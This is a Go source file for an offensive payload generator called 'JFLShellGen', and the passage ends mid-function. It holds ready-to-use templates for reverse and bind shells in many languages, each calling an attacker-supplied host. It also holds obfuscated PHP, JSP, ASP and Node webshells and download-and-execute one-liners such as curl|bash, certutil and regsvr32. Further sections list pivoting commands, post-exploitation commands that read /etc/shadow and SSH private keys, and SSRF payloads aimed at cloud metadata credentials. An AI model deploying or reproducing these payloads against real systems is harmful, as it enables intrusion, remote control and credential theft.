package main

import (
	"bufio"
	"crypto/md5"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"math/rand"
	"net/url"
	"os"
	"strings"
	"time"
)

const (
	DeveloperName = "jakeloai+AI"
	Version       = "1.0.0"
	ToolName      = "JFLShellGen"
)

var rng = rand.New(rand.NewSource(time.Now().UnixNano()))

func randomCase(s string) string {
	result := make([]byte, len(s))
	for i := range s {
		if rng.Intn(2) == 0 {
			result[i] = byte(strings.ToUpper(string(s[i]))[0])
		} else {
			result[i] = byte(strings.ToLower(string(s[i]))[0])
		}
	}
	return string(result)
}

func encodeBase64(s string) string {
	return base64.StdEncoding.EncodeToString([]byte(s))
}

func encodeURLEncode(s string) string {
	return url.QueryEscape(s)
}

func encodeHex(s string) string {
	return hex.EncodeToString([]byte(s))
}

func removeDuplicates(payloads []string) []string {
	seen := make(map[string]bool)
	unique := make([]string, 0)
	for _, p := range payloads {
		trimmed := strings.TrimSpace(p)
		if trimmed == "" {
			continue
		}
		if !seen[trimmed] {
			seen[trimmed] = true
			unique = append(unique, trimmed)
		}
	}
	return unique
}

func writePayloadsToFile(filepath string, payloads []string) error {
	file, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer file.Close()
	writer := bufio.NewWriter(file)
	for _, payload := range payloads {
		_, err := writer.WriteString(payload + "\n")
		if err != nil {
			return err
		}
	}
	return writer.Flush()
}

func calculateMD5(filepath string) (string, error) {
	data, err := os.ReadFile(filepath)
	if err != nil {
		return "", err
	}
	hash := md5.Sum(data)
	return hex.EncodeToString(hash[:]), nil
}

type ShellTemplate struct {
	Name       string
	OS         string
	Shell      string
	Type       string
	Template   string
	NeedsLHost bool
	NeedsLPort bool
}

type WebShellTemplate struct {
	Language string
	Type     string
	Template string
}

type GeneratedPayload struct {
	Category string `json:"category"`
	Name     string `json:"name"`
	OS       string `json:"os"`
	Shell    string `json:"shell"`
	Type     string `json:"type"`
	Payload  string `json:"payload"`
}

func getReverseShellTemplates() []ShellTemplate {
	return []ShellTemplate{
		{Name: "bash-tcp", OS: "linux", Shell: "bash", Type: "reverse_tcp",
			Template: `bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1`, NeedsLHost: true, NeedsLPort: true},
		{Name: "bash-tcp-196", OS: "linux", Shell: "bash", Type: "reverse_tcp",
			Template: `0<&196;exec 196<>/dev/tcp/{{LHOST}}/{{LPORT}}; sh <&196 >&196 2>&196`, NeedsLHost: true, NeedsLPort: true},
		{Name: "bash-udp", OS: "linux", Shell: "bash", Type: "reverse_udp",
			Template: `bash -i >& /dev/udp/{{LHOST}}/{{LPORT}} 0>&1`, NeedsLHost: true, NeedsLPort: true},
		{Name: "sh-tcp", OS: "linux", Shell: "sh", Type: "reverse_tcp",
			Template: `sh -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1`, NeedsLHost: true, NeedsLPort: true},
		{Name: "python-tcp", OS: "linux", Shell: "python", Type: "reverse_tcp",
			Template: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{{LHOST}}",{{LPORT}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`, NeedsLHost: true, NeedsLPort: true},
		{Name: "python3-tcp", OS: "linux", Shell: "python3", Type: "reverse_tcp",
			Template: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{{LHOST}}",{{LPORT}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`, NeedsLHost: true, NeedsLPort: true},
		{Name: "perl-tcp", OS: "linux", Shell: "perl", Type: "reverse_tcp",
			Template: `perl -e 'use Socket;$i="{{LHOST}}";$p={{LPORT}};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`, NeedsLHost: true, NeedsLPort: true},
		{Name: "ruby-tcp", OS: "linux", Shell: "ruby", Type: "reverse_tcp",
			Template: `ruby -rsocket -e'f=TCPSocket.open("{{LHOST}}",{{LPORT}}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`, NeedsLHost: true, NeedsLPort: true},
		{Name: "php-tcp", OS: "linux", Shell: "php", Type: "reverse_tcp",
			Template: `php -r '$sock=fsockopen("{{LHOST}}",{{LPORT}});exec("/bin/sh -i <&3 >&3 2>&3");'`, NeedsLHost: true, NeedsLPort: true},
		{Name: "php-tcp2", OS: "linux", Shell: "php", Type: "reverse_tcp",
			Template: `php -r '$sock=fsockopen("{{LHOST}}",{{LPORT}});shell_exec("/bin/sh -i <&3 >&3 2>&3");'`, NeedsLHost: true, NeedsLPort: true},
		{Name: "nc-traditional", OS: "linux", Shell: "nc", Type: "reverse_tcp",
			Template: `nc -e /bin/sh {{LHOST}} {{LPORT}}`, NeedsLHost: true, NeedsLPort: true},
		{Name: "nc-openbsd", OS: "linux", Shell: "nc", Type: "reverse_tcp",
			Template: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{LHOST}} {{LPORT}} >/tmp/f`, NeedsLHost: true, NeedsLPort: true},
		{Name: "awk-tcp", OS: "linux", Shell: "awk", Type: "reverse_tcp",
			Template: `awk 'BEGIN {s="/inet/tcp/0/{{LHOST}}/{{LPORT}}"; while(42) {do{printf "shell>" |& s; s |& getline c; if(c){while ((c |& getline) > 0) print $0 |& s; close(c);}} while(c!="exit") close(s);}}' /dev/null`, NeedsLHost: true, NeedsLPort: true},
		{Name: "lua-tcp", OS: "linux", Shell: "lua", Type: "reverse_tcp",
			Template: `lua -e 'require("socket");require("os");t=socket.tcp();t:connect("{{LHOST}}","{{LPORT}}");os.execute("/bin/sh -i <&3 >&3 2>&3");'`, NeedsLHost: true, NeedsLPort: true},
		{Name: "java-tcp", OS: "linux", Shell: "java", Type: "reverse_tcp",
			Template: `r = Runtime.getRuntime();p = r.exec(["/bin/sh","-c","exec 5<>/dev/tcp/{{LHOST}}/{{LPORT}};cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[]);p.waitFor();`, NeedsLHost: true, NeedsLPort: true},
		{Name: "go-tcp", OS: "linux", Shell: "go", Type: "reverse_tcp",
			Template: `echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","{{LHOST}}:{{LPORT}}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go`, NeedsLHost: true, NeedsLPort: true},
		{Name: "openssl-tcp", OS: "linux", Shell: "openssl", Type: "reverse_tcp",
			Template: `mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {{LHOST}}:{{LPORT}} > /tmp/s; rm /tmp/s`, NeedsLHost: true, NeedsLPort: true},
		{Name: "socat-tcp", OS: "linux", Shell: "socat", Type: "reverse_tcp",
			Template: `socat exec:'/bin/sh -li',pty,stderr,setsid,sigint,sane tcp:{{LHOST}}:{{LPORT}}`, NeedsLHost: true, NeedsLPort: true},
		{Name: "telnet-tcp", OS: "linux", Shell: "telnet", Type: "reverse_tcp",
			Template: `TF=$(mktemp -u);mkfifo $TF && telnet {{LHOST}} {{LPORT}} 0<$TF | /bin/sh 1>$TF 2>&1;rm -f $TF`, NeedsLHost: true, NeedsLPort: true},
		{Name: "expect-tcp", OS: "linux", Shell: "expect", Type: "reverse_tcp",
			Template: `expect -c 'spawn /bin/sh;interact' | nc {{LHOST}} {{LPORT}}`, NeedsLHost: true, NeedsLPort: true},
		{Name: "powershell-tcp", OS: "windows", Shell: "powershell", Type: "reverse_tcp",
			Template: `$client = New-Object System.Net.Sockets.TCPClient("{{LHOST}}",{{LPORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`, NeedsLHost: true, NeedsLPort: true},
		{Name: "cmd-nc", OS: "windows", Shell: "cmd", Type: "reverse_tcp",
			Template: `nc.exe -e cmd.exe {{LHOST}} {{LPORT}}`, NeedsLHost: true, NeedsLPort: true},
		{Name: "python-windows-tcp", OS: "windows", Shell: "python", Type: "reverse_tcp",
			Template: `python.exe -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{{LHOST}}',{{LPORT}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['cmd.exe','/K'])"`, NeedsLHost: true, NeedsLPort: true},
		{Name: "bash-macos-tcp", OS: "macos", Shell: "bash", Type: "reverse_tcp",
			Template: `bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1`, NeedsLHost: true, NeedsLPort: true},
		{Name: "python-macos-tcp", OS: "macos", Shell: "python", Type: "reverse_tcp",
			Template: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{{LHOST}}",{{LPORT}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`, NeedsLHost: true, NeedsLPort: true},
	}
}

func getBindShellTemplates() []ShellTemplate {
	return []ShellTemplate{
		{Name: "bash-bind", OS: "linux", Shell: "bash", Type: "bind_tcp",
			Template: `nc -lvp {{LPORT}} -e /bin/sh`, NeedsLHost: false, NeedsLPort: true},
		{Name: "python-bind", OS: "linux", Shell: "python", Type: "bind_tcp",
			Template: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",{{LPORT}}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/sh","-i"])'`, NeedsLHost: false, NeedsLPort: true},
		{Name: "python3-bind", OS: "linux", Shell: "python3", Type: "bind_tcp",
			Template: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",{{LPORT}}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/sh","-i"])'`, NeedsLHost: false, NeedsLPort: true},
		{Name: "php-bind", OS: "linux", Shell: "php", Type: "bind_tcp",
			Template: `php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",{{LPORT}});socket_listen($s,1);$c=socket_accept($s);socket_getpeername($c,$a,$p);exec("/bin/sh -i <&3 >&3 2>&3");'`, NeedsLHost: false, NeedsLPort: true},
		{Name: "powershell-bind", OS: "windows", Shell: "powershell", Type: "bind_tcp",
			Template: `$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0', {{LPORT}});$listener.Start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()`, NeedsLHost: false, NeedsLPort: true},
		{Name: "nc-bind-windows", OS: "windows", Shell: "nc", Type: "bind_tcp",
			Template: `nc.exe -lvp {{LPORT}} -e cmd.exe`, NeedsLHost: false, NeedsLPort: true},
	}
}

func getWebShellTemplates() []WebShellTemplate {
	return []WebShellTemplate{
		{Language: "php", Type: "system_get", Template: `<?php system($_GET['cmd']); ?>`},
		{Language: "php", Type: "system_post", Template: `<?php system($_POST['cmd']); ?>`},
		{Language: "php", Type: "system_request", Template: `<?php system($_REQUEST['cmd']); ?>`},
		{Language: "php", Type: "exec_get", Template: `<?php echo exec($_GET['cmd']); ?>`},
		{Language: "php", Type: "shell_exec_get", Template: `<?php echo shell_exec($_GET['cmd']); ?>`},
		{Language: "php", Type: "passthru_get", Template: `<?php passthru($_GET['cmd']); ?>`},
		{Language: "php", Type: "proc_open", Template: `<?php $descriptorspec = array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w')); $process = proc_open($_GET['cmd'], $descriptorspec, $pipes); echo stream_get_contents($pipes[1]); ?>`},
		{Language: "php", Type: "popen", Template: `<?php $handle = popen($_GET['cmd'], 'r'); echo fread($handle, 2096); pclose($handle); ?>`},
		{Language: "php", Type: "eval_get", Template: `<?php eval($_GET['cmd']); ?>`},
		{Language: "php", Type: "assert_get", Template: `<?php @assert($_GET['cmd']); ?>`},
		{Language: "php", Type: "base64_eval", Template: `<?php eval(base64_decode($_GET['cmd'])); ?>`},
		{Language: "php", Type: "preg_replace", Template: `<?php preg_replace('/.*/e', $_GET['cmd'], '.'); ?>`},
		{Language: "php", Type: "create_function", Template: `<?php $f = create_function('', $_GET['cmd']); $f(); ?>`},
		{Language: "php", Type: "array_map", Template: `<?php array_map('system', array($_GET['cmd'])); ?>`},
		{Language: "php", Type: "array_filter", Template: `<?php array_filter(array($_GET['cmd']), 'system'); ?>`},
		{Language: "php", Type: "usort", Template: `<?php usort(array(1), create_function('$a,$b', $_GET['cmd'])); ?>`},
		{Language: "php", Type: "file_put_contents", Template: `<?php file_put_contents('shell.php', '<?php system($_GET[1]);?>'); ?>`},
		{Language: "php", Type: "dynamic_func", Template: `<?php $_=$_GET; @$_[0]($_[1]); ?>`},
		{Language: "php", Type: "str_concat", Template: `<?php $a='sys';$b='tem';$c=$a.$b;$c($_GET['cmd']); ?>`},
		{Language: "php", Type: "hex2bin_xor", Template: `<?php $_=(hex2bin('2923292e3f37')^str_repeat(chr(90),6)); $_($_GET['cmd']); ?>`},
		{Language: "php", Type: "not_hex2bin", Template: `<?php $_=(~hex2bin('8c868c8b9a92')); $_($_GET['cmd']); ?>`},
		{Language: "php", Type: "file_manager", Template: `<?php if(isset($_GET['f'])){echo '<pre>'.shell_exec($_GET['f']).'</pre>';}if(isset($_FILES['f'])){move_uploaded_file($_FILES['f']['tmp_name'],$_FILES['f']['name']);echo 'OK';} ?>`},
		{Language: "php", Type: "phpinfo", Template: `<?php phpinfo(); ?>`},
		{Language: "php", Type: "bypass_disabled", Template: `<?php putenv('LD_PRELOAD=/tmp/bypass.so'); mail('a','a','a','a'); ?>`},
		{Language: "jsp", Type: "basic", Template: `<%@ page import="java.io.*" %><% String cmd = request.getParameter("cmd"); String output = ""; if(cmd != null) { Process p = Runtime.getRuntime().exec(cmd); BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream())); String line = ""; while((line = reader.readLine()) != null) { output += line + "\n"; } } %><pre><%= output %></pre>`},
		{Language: "jsp", Type: "processbuilder", Template: `<%@ page import="java.io.*" %><% String[] cmd = {"/bin/sh", "-c", request.getParameter("cmd")}; ProcessBuilder pb = new ProcessBuilder(cmd); Process p = pb.start(); BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream())); String line; while((line = reader.readLine()) != null) { out.println(line); } %>`},
		{Language: "jsp", Type: "reverse", Template: `<%@ page import="java.io.*,java.net.*" %><% String host="{{LHOST}}"; int port={{LPORT}}; Socket s=new Socket(host,port); Process p=new ProcessBuilder("/bin/sh").redirectErrorStream(true).start(); InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream(); OutputStream po=p.getOutputStream(),so=s.getOutputStream(); while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);}p.destroy();s.close(); %>`},
		{Language: "asp", Type: "basic", Template: `<% Set objShell = CreateObject("WScript.Shell") : Set objExec = objShell.Exec("cmd /c " & Request("cmd")) : Response.Write objExec.StdOut.ReadAll() %>`},
		{Language: "asp", Type: "wscript", Template: `<% Response.Write CreateObject("WScript.Shell").Exec(Request("cmd")).StdOut.ReadAll() %>`},
		{Language: "aspx", Type: "basic", Template: `<%@ Page Language="C#" %><% string cmd = Request["cmd"]; System.Diagnostics.Process p = new System.Diagnostics.Process(); p.StartInfo.FileName = "cmd.exe"; p.StartInfo.Arguments = "/c " + cmd; p.StartInfo.RedirectStandardOutput = true; p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); %>`},
		{Language: "aspx", Type: "csharp", Template: `<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["cmd"]); %>`},
		{Language: "python", Type: "flask", Template: "from flask import Flask, request\nimport subprocess\napp = Flask(__name__)\n@app.route('/shell')\ndef shell():\n    return subprocess.check_output(request.args.get('cmd'), shell=True)\nif __name__ == '__main__':\n    app.run()"},
		{Language: "python", Type: "wsgi", Template: "import subprocess\ndef application(environ, start_response):\n    cmd = environ.get('QUERY_STRING', '').split('=')[1]\n    output = subprocess.check_output(cmd, shell=True)\n    start_response('200 OK', [('Content-Type', 'text/plain')])\n    return [output]"},
		{Language: "ruby", Type: "sinatra", Template: "require 'sinatra'\nrequire 'open3'\nget '/shell' do\n  stdout, stderr, status = Open3.capture3(params[:cmd])\n  stdout\nend"},
		{Language: "ruby", Type: "rack", Template: "require 'rack'\napp = Proc.new do |env|\n  cmd = Rack::Request.new(env).params['cmd']\n  [200, {'Content-Type' => 'text/plain'}, [IO.popen(cmd).read]]\nend\nRack::Handler::WEBrick.run app"},
		{Language: "nodejs", Type: "express", Template: `const express = require('express');\nconst { exec } = require('child_process');\nconst app = express();\napp.get('/shell', (req, res) => {\n    exec(req.query.cmd, (err, stdout) => {\n        res.send(stdout);\n    });\n});\napp.listen(3000);`},
		{Language: "nodejs", Type: "http", Template: `const http = require('http');\nconst { exec } = require('child_process');\nhttp.createServer((req, res) => {\n    const cmd = new URL(req.url, 'http://localhost').searchParams.get('cmd');\n    exec(cmd, (err, stdout) => res.end(stdout));\n}).listen(3000);`},
		{Language: "perl", Type: "cgi", Template: "#!/usr/bin/perl\nprint \"Content-type: text/plain\n\n\";\n$cmd = $ENV{'QUERY_STRING'};\n$cmd =~ s/cmd=//;\nprint `$cmd`;"},
		{Language: "lua", Type: "openresty", Template: `location /shell {\n    content_by_lua_block {\n        local cmd = ngx.var.arg_cmd\n        local handle = io.popen(cmd)\n        local result = handle:read('*a')\n        handle:close()\n        ngx.say(result)\n    }\n}`},
		{Language: "coldfusion", Type: "basic", Template: `<cfexecute name="cmd" arguments="#URL.cmd#" timeout="10" variable="output"></cfexecute><cfoutput>#output#</cfoutput>`},
	}
}

func getDownloadExecuteTemplates() []ShellTemplate {
	return []ShellTemplate{
		{Name: "curl-bash", OS: "linux", Shell: "bash", Type: "download_exec",
			Template: `curl -fsSL http://{{LHOST}}:{{LPORT}}/shell.sh | bash`, NeedsLHost: true, NeedsLPort: true},
		{Name: "wget-bash", OS: "linux", Shell: "bash", Type: "download_exec",
			Template: `wget -q -O - http://{{LHOST}}:{{LPORT}}/shell.sh | bash`, NeedsLHost: true, NeedsLPort: true},
		{Name: "python-download", OS: "linux", Shell: "python", Type: "download_exec",
			Template: `python -c 'import urllib2; exec(urllib2.urlopen("http://{{LHOST}}:{{LPORT}}/shell.py").read())'`, NeedsLHost: true, NeedsLPort: true},
		{Name: "python3-download", OS: "linux", Shell: "python3", Type: "download_exec",
			Template: `python3 -c 'import urllib.request; exec(urllib.request.urlopen("http://{{LHOST}}:{{LPORT}}/shell.py").read())'`, NeedsLHost: true, NeedsLPort: true},
		{Name: "perl-download", OS: "linux", Shell: "perl", Type: "download_exec",
			Template: `perl -e 'use LWP::Simple; eval(get("http://{{LHOST}}:{{LPORT}}/shell.pl"));'`, NeedsLHost: true, NeedsLPort: true},
		{Name: "ruby-download", OS: "linux", Shell: "ruby", Type: "download_exec",
			Template: `ruby -e 'require "open-uri"; eval(open("http://{{LHOST}}:{{LPORT}}/shell.rb").read)'`, NeedsLHost: true, NeedsLPort: true},
		{Name: "php-download", OS: "linux", Shell: "php", Type: "download_exec",
			Template: `php -r 'eval(file_get_contents("http://{{LHOST}}:{{LPORT}}/shell.php"));'`, NeedsLHost: true, NeedsLPort: true},
		{Name: "fetch-bsd", OS: "linux", Shell: "fetch", Type: "download_exec",
			Template: `fetch -o - http://{{LHOST}}:{{LPORT}}/shell.sh | sh`, NeedsLHost: true, NeedsLPort: true},
		{Name: "lwp-download", OS: "linux", Shell: "perl", Type: "download_exec",
			Template: `lwp-download http://{{LHOST}}:{{LPORT}}/shell.sh /tmp/shell.sh && bash /tmp/shell.sh`, NeedsLHost: true, NeedsLPort: true},
		{Name: "powershell-iex", OS: "windows", Shell: "powershell", Type: "download_exec",
			Template: `powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).downloadString('http://{{LHOST}}:{{LPORT}}/shell.ps1')"`, NeedsLHost: true, NeedsLPort: true},
		{Name: "powershell-wget", OS: "windows", Shell: "powershell", Type: "download_exec",
			Template: `powershell -nop -w hidden -c "wget http://{{LHOST}}:{{LPORT}}/shell.ps1 -OutFile C:\Windows\Temp\shell.ps1; C:\Windows\Temp\shell.ps1"`, NeedsLHost: true, NeedsLPort: true},
		{Name: "certutil", OS: "windows", Shell: "cmd", Type: "download_exec",
			Template: `certutil -urlcache -split -f http://{{LHOST}}:{{LPORT}}/shell.exe C:\Windows\Temp\shell.exe && C:\Windows\Temp\shell.exe`, NeedsLHost: true, NeedsLPort: true},
		{Name: "bitsadmin", OS: "windows", Shell: "cmd", Type: "download_exec",
			Template: `bitsadmin /transfer n http://{{LHOST}}:{{LPORT}}/shell.exe C:\Windows\Temp\shell.exe && C:\Windows\Temp\shell.exe`, NeedsLHost: true, NeedsLPort: true},
		{Name: "mshta", OS: "windows", Shell: "mshta", Type: "download_exec",
			Template: `mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run """"cmd /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).downloadString('http://{{LHOST}}:{{LPORT}}/shell.ps1')"""":close")`, NeedsLHost: true, NeedsLPort: true},
		{Name: "regsvr32", OS: "windows", Shell: "regsvr32", Type: "download_exec",
			Template: `regsvr32 /s /n /u /i:http://{{LHOST}}:{{LPORT}}/shell.sct scrobj.dll`, NeedsLHost: true, NeedsLPort: true},
		{Name: "cscript-download", OS: "windows", Shell: "vbs", Type: "download_exec",
			Template: `cscript //nologo C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:http://{{LHOST}}:{{LPORT}}/shell.sct`, NeedsLHost: true, NeedsLPort: true},
	}
}

func getTTYUpgradeTemplates() []string {
	return []string{
		`python -c 'import pty; pty.spawn("/bin/bash")'`,
		`python3 -c 'import pty; pty.spawn("/bin/bash")'`,
		`script -qc /bin/bash /dev/null`,
		`script /dev/null -c bash`,
		`echo 'os.system("/bin/bash")' | python`,
		`perl -e 'exec "/bin/bash";'`,
		`ruby -e 'exec "/bin/bash"'`,
		`lua -e 'os.execute("/bin/bash")'`,
		`/bin/bash -i`,
		`SHELL=/bin/bash script -q /dev/null`,
	}
}

func getStabilizationCommands() []string {
	return []string{
		`export TERM=xterm`,
		`export SHELL=bash`,
		`stty raw -echo; fg`,
		`reset`,
		`stty rows 38 columns 116`,
		`alias ll='ls -la'`,
		`export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`,
	}
}

func getPivotingTemplates() []ShellTemplate {
	return []ShellTemplate{
		{Name: "ssh-local-forward", OS: "linux", Shell: "ssh", Type: "pivot",
			Template: `ssh -L {{LPORT}}:{{TARGET}}:{{TARGET_PORT}} user@{{PIVOT}}`, NeedsLHost: false, NeedsLPort: true},
		{Name: "ssh-remote-forward", OS: "linux", Shell: "ssh", Type: "pivot",
			Template: `ssh -R {{LPORT}}:localhost:{{TARGET_PORT}} user@{{LHOST}}`, NeedsLHost: true, NeedsLPort: true},
		{Name: "ssh-dynamic-proxy", OS: "linux", Shell: "ssh", Type: "pivot",
			Template: `ssh -D {{LPORT}} user@{{PIVOT}}`, NeedsLHost: false, NeedsLPort: true},
		{Name: "socat-tcp-relay", OS: "linux", Shell: "socat", Type: "pivot",
			Template: `socat TCP-LISTEN:{{LPORT}},fork TCP:{{TARGET}}:{{TARGET_PORT}}`, NeedsLHost: false, NeedsLPort: true},
		{Name: "socat-udp-relay", OS: "linux", Shell: "socat", Type: "pivot",
			Template: `socat UDP-LISTEN:{{LPORT}},fork UDP:{{TARGET}}:{{TARGET_PORT}}`, NeedsLHost: false, NeedsLPort: true},
		{Name: "chisel-server", OS: "linux", Shell: "chisel", Type: "pivot",
			Template: `chisel server -p {{LPORT}} --reverse`, NeedsLHost: false, NeedsLPort: true},
		{Name: "chisel-client", OS: "linux", Shell: "chisel", Type: "pivot",
			Template: `chisel client {{LHOST}}:{{LPORT}} R:socks`, NeedsLHost: true, NeedsLPort: true},
		{Name: "ligolo-agent", OS: "linux", Shell: "ligolo", Type: "pivot",
			Template: `./agent -connect {{LHOST}}:{{LPORT}} -ignore-cert`, NeedsLHost: true, NeedsLPort: true},
		{Name: "stunnel-client", OS: "linux", Shell: "stunnel", Type: "pivot",
			Template: `stunnel client.conf`, NeedsLHost: false, NeedsLPort: false},
		{Name: "plink-local-forward", OS: "windows", Shell: "plink", Type: "pivot",
			Template: `plink.exe -L {{LPORT}}:{{TARGET}}:{{TARGET_PORT}} user@{{PIVOT}} -N`, NeedsLHost: false, NeedsLPort: true},
		{Name: "plink-remote-forward", OS: "windows", Shell: "plink", Type: "pivot",
			Template: `plink.exe -R {{LPORT}}:localhost:{{TARGET_PORT}} user@{{LHOST}} -N`, NeedsLHost: true, NeedsLPort: true},
		{Name: "netsh-portproxy", OS: "windows", Shell: "netsh", Type: "pivot",
			Template: `netsh interface portproxy add v4tov4 listenport={{LPORT}} connectport={{TARGET_PORT}} connectaddress={{TARGET}}`, NeedsLHost: false, NeedsLPort: true},
	}
}

func getPostExploitLinux() []string {
	return []string{
		`id && whoami && groups`,
		`cat /etc/passwd`,
		`cat /etc/shadow 2>/dev/null`,
		`cat /etc/crontab`,
		`find / -perm -4000 -type f 2>/dev/null`,
		`find / -writable -type d 2>/dev/null | head -20`,
		`find / -name '*.pem' -o -name '*.key' -o -name '*.p12' 2>/dev/null | head -20`,
		`netstat -tulpn 2>/dev/null || ss -tulpn`,
		`ip addr || ifconfig`,
		`route -n || ip route`,
		`cat /proc/self/environ`,
		`env`,
		`ps aux`,
		`cat /etc/hosts`,
		`ls -la /home/`,
		`find /var/www -type f -name '*.php' 2>/dev/null | head -10`,
		`cat ~/.ssh/id_rsa 2>/dev/null`,
		`cat ~/.ssh/authorized_keys 2>/dev/null`,
		`find /tmp -type f -newer /etc/passwd 2>/dev/null`,
		`dmesg | grep -i 'vulnerable'`,
		`uname -a`,
		`cat /etc/os-release`,
		`dpkg -l | grep -i kernel`,
		`systemctl list-timers --all`,
		`find / -name '.git' -type d 2>/dev/null | head -10`,
	}
}

func getPostExploitWindows() []string {
	return []string{
		`whoami /all`,
		`net user`,
		`net localgroup administrators`,
		`netstat -ano`,
		`ipconfig /all`,
		`route print`,
		`systeminfo`,
		`tasklist /v`,
		`wmic process list brief`,
		`reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`,
		`schtasks /query /fo LIST /v`,
		`type C:\Windows\System32\drivers\etc\hosts`,
		`dir C:\Users\ /s /b | findstr \.ssh\`,
		`findstr /si password *.txt *.ini *.config *.xml 2>nul`,
		`powershell -c "Get-ChildItem -Path C:\ -Include *.pem,*.key,*.pfx -Recurse -ErrorAction SilentlyContinue | Select-Object -First 10"`,
		`powershell -c "Get-WmiObject -Class Win32_UserAccount | Select Name,SID"`,
		`powershell -c "Get-Process | Where-Object {$_.MainModule.FileName -like '*temp*'}"`,
	}
}

func getSSRFTargets() []string {
	return []string{
		`http://169.254.169.254/latest/meta-data/`,
		`http://169.254.169.254/latest/meta-data/iam/security-credentials/`,
		`http://169.254.169.254/latest/user-data`,
		`http://metadata.google.internal/computeMetadata/v1/`,
		`http://100.100.100.200/latest/meta-data/`,
		`http://192.0.0.192/latest/`,
		`http://127.0.0.1:22/`,
		`http://127.0.0.1:80/`,
		`http://127.0.0.1:443/`,
		`http://127.0.0.1:8080/`,
		`http://127.0.0.1:3306/`,
		`http://127.0.0.1:6379/`,
		`http://127.0.0.1:9200/`,
		`http://10.0.0.1/`,
		`http://10.0.0.2/`,
		`http://172.17.0.1/`,
		`http://192.168.1.1/`,
		`file:///etc/passwd`,
		`file:///C:/windows/win.ini`,
		`dict://127.0.0.1:6379/info`,
		`gopher://127.0.0.1:6379/_FLUSHALL%0D%0ASET%20shell%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{{LHOST}}%2F{{LPORT}}%200%3E%261%22%0D%0ACONFIG%20SET%20dir%20%2Fvar%2Fwww%2Fhtml%0D%0ACONFIG%20SET%20dbfilename%20shell.php%0D%0ASAVE`,
		`ldap://127.0.0.1:389/`,
		`ftp://anonymous:anonymous@127.0.0.1/`,
	}
}

func generateEncodingVariants(payload string) []string {
	variants := make([]string, 0)
